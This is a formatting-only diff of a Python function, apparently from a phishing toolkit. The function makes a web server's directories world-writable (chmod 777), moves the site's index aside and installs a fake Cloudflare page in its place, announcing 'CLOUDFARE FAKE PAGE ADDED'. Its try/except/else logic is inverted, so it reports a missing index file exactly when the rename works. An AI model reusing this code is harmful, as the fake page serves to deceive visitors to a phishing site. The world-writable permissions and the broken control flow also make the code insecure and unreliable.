@@ -6,7 +6,14 @@
 #
 
 
-from Defs.ImportManager.unsorted_will_be_replaced import wait, run_command, pathlib_Path, replace, copyfile, chmod
+from Defs.ImportManager.unsorted_will_be_replaced import (
+    wait,
+    run_command,
+    pathlib_Path,
+    replace,
+    copyfile,
+    chmod,
+)
 import Defs.ThemeManager.theme as theme
 
 default_palette = theme.default_palette
@@ -15,16 +22,19 @@ default_palette = theme.default_palette
 def add_cloudfare():
     # run_command('mv Server/www/index.* Server/www/home.php &
     # & cp WebPages/cloudfare.html Server/www/index.html')
-    chmod('Server', 0o777)
-    chmod('Server/www', 0o777)
+    chmod("Server", 0o777)
+    chmod("Server/www", 0o777)
     try:
-        replace('Server/www/index.php', 'Server/www/home.php')
+        replace("Server/www/index.php", "Server/www/home.php")
     except:
-        replace('Server/www/index.html', 'Server/www/home.php')
+        replace("Server/www/index.html", "Server/www/home.php")
     else:
-        print('Unable to find index file, skipping...')
+        print("Unable to find index file, skipping...")
         return
-    copyfile('WebPages/cloudflare.html', 'Server/www/index.html')
-    print("\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(
-        default_palette[0], default_palette[4]))
+    copyfile("WebPages/cloudflare.html", "Server/www/index.html")
+    print(
+        "\n{0}[{1}#{0}]CLOUDFARE FAKE PAGE{0} ADDED...".format(
+            default_palette[0], default_palette[4]
+        )
+    )
     wait(1)
